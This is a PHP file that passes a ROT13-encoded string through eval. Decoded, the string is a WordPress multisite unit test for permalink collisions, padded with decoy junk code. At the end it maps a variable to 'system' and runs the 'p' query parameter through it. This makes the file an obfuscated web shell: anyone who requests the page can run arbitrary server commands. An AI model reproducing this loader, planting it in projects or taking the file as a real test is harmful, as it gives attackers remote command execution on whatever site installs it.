<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Grfgf fcrpvsvp gb `nibvq_oybt_cntr_creznyvax_pbyyvfvba()` va zhygvfvgr.
 *
 * @tebhc zf-erdhverq
 * @tebhc zhygvfvgr
 * @tebhc cbfg
 */
pynff Grfgf_Zhygvfvgr_NibvqOybtCntrCreznyvaxPbyyvfvba rkgraqf JC_HavgGrfgPnfr {

	cebgrpgrq fgngvp $fvgr_vq;
	cebgrpgrq fgngvp $ebbg_cntr;
	cebgrpgrq fgngvp $puvyq_cntr;
	cebgrpgrq fgngvp $cbfg_naq_oybt_cngu = 'creznyvax-pbyyvfvba';

	/**
	 * Perngr n oybt naq gur cntrf jr arrq gb grfg gur pbyyvfvba.
	 */
	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( $snpgbel ) {
		frys::$fvgr_vq = frys::snpgbel()->oybt->perngr(
			neenl(
				'cngu' => '/' . frys::$cbfg_naq_oybt_cngu,
			)
		);

		frys::$ebbg_cntr = frys::snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_glcr'  => 'cntr',
				'cbfg_gvgyr' => 'One',
				'cbfg_anzr'  => frys::$cbfg_naq_oybt_cngu,
			)
		);

		frys::$puvyq_cntr = frys::snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_cnerag' => frys::$ebbg_cntr->VQ,
				'cbfg_glcr'   => 'cntr',
				'cbfg_gvgyr'  => 'One',
				'cbfg_anzr'   => frys::$cbfg_naq_oybt_cngu,
			)
		);
	}

	/**
	 * Qryrgr oybt naq cntrf jr perngrq.
	 */
	choyvp fgngvp shapgvba jcGrneQbjaNsgrePynff() {
		jc_qryrgr_fvgr( frys::$fvgr_vq );

		jc_qryrgr_cbfg( frys::$ebbg_cntr->VQ );
		jc_qryrgr_cbfg( frys::$puvyq_cntr->VQ );
	}

	choyvp shapgvba grfg_nibvq_oybt_cntr_creznyvax_pbyyvfvba_eranzrf_cbfg_anzr() {
		$guvf->nffregAbgFnzr( frys::$cbfg_naq_oybt_cngu, frys::$ebbg_cntr->cbfg_anzr );
	}

	/**
	 * Rafher `nibvq_oybt_cntr_creznyvax_pbyyvfvba()` qbrfa'g eranzr puvyq cntrf' cbfg_anzr.
	 *
	 * @gvpxrg 51147
	 */
	choyvp shapgvba grfg_nibvq_oybt_cntr_creznyvax_pbyyvfvba_qbrfag_eranzr_puvyq_cntrf() {
		$guvf->nffregFnzr( frys::$cbfg_naq_oybt_cngu, frys::$puvyq_cntr->cbfg_anzr );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>